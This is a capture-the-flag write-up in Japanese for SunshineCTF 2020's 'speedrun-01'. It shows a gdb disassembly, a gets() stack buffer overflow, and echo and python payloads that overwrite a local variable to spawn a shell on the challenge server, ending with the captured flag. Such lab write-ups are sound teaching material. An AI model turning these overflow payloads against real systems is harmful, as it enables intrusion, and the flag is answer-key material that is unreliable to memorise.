# speedrun-01:Speedrun:10pts
nc chal.2020.sunshinectf.org 30001  
[chall_01](chall_01)  

# Solution
ファイルが配られる。  
```bash
$ file chall_01
chall_01: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=3de83476d090057c2e5d2ff4a8a2ec2ccd333285, not stripped
$ ./chall_01
Long time ago, you called upon the tombstones
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
$ ./chall_01
Long time ago, you called upon the tombstones
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault (コアダンプ)
```
[speedrun-00](../speedrun-00)と同じく、実行ファイルでありBOFがありそうだ。  
gdbでmainを見てみる。  
```bash
$ gdb chall_01
~~~
gdb-peda$ disass main
Dump of assembler code for function main:
   0x000000000000075a <+0>:     push   rbp
   0x000000000000075b <+1>:     mov    rbp,rsp
   0x000000000000075e <+4>:     sub    rsp,0x60
   0x0000000000000762 <+8>:     lea    rdi,[rip+0xef]        # 0x858
   0x0000000000000769 <+15>:    call   0x600 <puts@plt>
   0x000000000000076e <+20>:    mov    rdx,QWORD PTR [rip+0x20089b]        # 0x201010 <stdin@@GLIBC_2.2.5>
   0x0000000000000775 <+27>:    lea    rax,[rbp-0x20]
   0x0000000000000779 <+31>:    mov    esi,0x13
   0x000000000000077e <+36>:    mov    rdi,rax
   0x0000000000000781 <+39>:    call   0x620 <fgets@plt>
   0x0000000000000786 <+44>:    lea    rax,[rbp-0x60]
   0x000000000000078a <+48>:    mov    rdi,rax
   0x000000000000078d <+51>:    mov    eax,0x0
   0x0000000000000792 <+56>:    call   0x630 <gets@plt>
   0x0000000000000797 <+61>:    cmp    DWORD PTR [rbp-0x4],0xfacade
   0x000000000000079e <+68>:    jne    0x7ac <main+82>
   0x00000000000007a0 <+70>:    lea    rdi,[rip+0xdf]        # 0x886
   0x00000000000007a7 <+77>:    call   0x610 <system@plt>
   0x00000000000007ac <+82>:    cmp    DWORD PTR [rbp-0x8],0xfacade
   0x00000000000007b3 <+89>:    jne    0x7c1 <main+103>
   0x00000000000007b5 <+91>:    lea    rdi,[rip+0xca]        # 0x886
   0x00000000000007bc <+98>:    call   0x610 <system@plt>
   0x00000000000007c1 <+103>:   nop
   0x00000000000007c2 <+104>:   leave
   0x00000000000007c3 <+105>:   ret
End of assembler dump.
gdb-peda$ q
```
バッファが多めに確保されているようだ。  
gdbなどでパディングを調整し、BOFで以下のように書き換える。  
```bash
$ (echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xde\xca\xfa\x00";cat) | ./chall_01
Long time ago, you called upon the tombstones
ls
chall_01
^C
$ (python -c 'import sys; sys.stdout.buffer.write(b"A"*106 +  b"\xde\xca\xfa\x00")';cat) | ./chall_01
Long time ago, you called upon the tombstones

ls
chall_01
^C
$ (echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xde\xca\xfa\x00";cat) | nc chal.2020.sunshinectf.org 30001
Long time ago, you called upon the tombstones
ls
chall_01
flag.txt
cat flag.txt
sun{eternal-rest-6a5ee49d943a053a}
^C
```
シェルが得られるので、flag.txtを見るとflagが書かれていた。  

## sun{eternal-rest-6a5ee49d943a053a}